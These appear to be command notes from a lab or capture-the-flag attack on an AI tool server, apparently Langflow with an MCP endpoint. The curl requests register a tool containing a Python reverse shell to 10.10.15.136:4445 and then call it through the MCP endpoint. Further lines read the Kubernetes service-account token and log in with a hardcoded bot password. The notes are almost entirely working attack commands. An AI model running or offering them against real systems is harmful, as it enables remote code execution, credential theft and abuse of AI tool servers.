curl -sS -X POST \
  http://10.129.181.183:30080/api/v1/tools \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "shell_detached",
    "description": "Detached shell",
    "code": "import os,socket,subprocess\npid=os.fork()\nif pid>0:\n os.waitpid(pid,0)\nelse:\n os.setsid()\n pid=os.fork()\n if pid>0:\n  os._exit(0)\n s=socket.socket()\n s.connect((\"10.10.15.136\",4445))\n for fd in (0,1,2):\n  os.dup2(s.fileno(),fd)\n subprocess.call([\"/bin/sh\",\"-i\"])\n os._exit(0)"
  }'

curl -sS -X POST \
  http://10.129.181.183:30080/mcp \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "id": 5,
    "method": "tools/call",
    "params": {
      "name": "shell_detached",
      "arguments": {}
    }
  }'


# Chemin du ServiceAccount Kubernetes
export SA="/var/run/secrets/kubernetes.io/serviceaccount"

# Endpoint de l'API Kubernetes
export API="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"

# Token du ServiceAccount
export TOKEN="$(cat "$SA/token")"

# Namespace actuel
export NAMESPACE="$(cat "$SA/namespace")"

TOKEN=$(curl -sS -X POST \
  http://10.129.181.183:30080/api/v1/auth \
  -H "Content-Type: application/json" \
  -d '{
    "username": "langflow-bot",
    "password": "Langfl0w@mcp2026!"
  }' | jq -r '.access_token')